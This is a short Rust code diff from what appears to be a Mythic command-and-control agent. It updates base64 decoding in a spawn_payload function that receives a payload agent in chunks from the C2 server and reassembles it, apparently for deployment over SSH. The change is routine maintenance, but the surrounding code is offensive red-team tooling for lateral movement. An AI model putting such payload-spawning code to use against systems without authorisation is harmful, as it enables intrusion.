@@ -1,7 +1,8 @@
 use super::{ssh_authenticate, Credentials};
-use crate::agent::AgentTask;
-use crate::agent::ContinuedData;
+use crate::AgentTask;
+use crate::ContinuedData;
 use crate::{mythic_continued, mythic_success};
+use base64::{Engine as _, engine::general_purpose};
 use serde::Deserialize;
 use serde_json::json;
 use std::error::Error;
@@ -65,7 +66,7 @@ pub fn spawn_payload(
     let continued_args: ContinuedData = serde_json::from_str(&task.parameters)?;
 
     // Download and decode the agent
-    let mut file_data: Vec<u8> = base64::decode(continued_args.chunk_data.unwrap())?;
+    let mut file_data: Vec<u8> = general_purpose::STANDARD.decode(continued_args.chunk_data.unwrap())?;
     let total_chunks = continued_args.total_chunks.unwrap();
 
     for chunk_num in 2..=total_chunks {
@@ -82,7 +83,7 @@ pub fn spawn_payload(
         let task: AgentTask = serde_json::from_value(rx.recv()?)?;
         let continued_args: ContinuedData = serde_json::from_str(&task.parameters)?;
 
-        file_data.append(&mut base64::decode(continued_args.chunk_data.unwrap())?);
+        file_data.append(&mut general_purpose::STANDARD.decode(continued_args.chunk_data.unwrap())?);
     }
 
     // Notify Mythic that the agent was downloaded
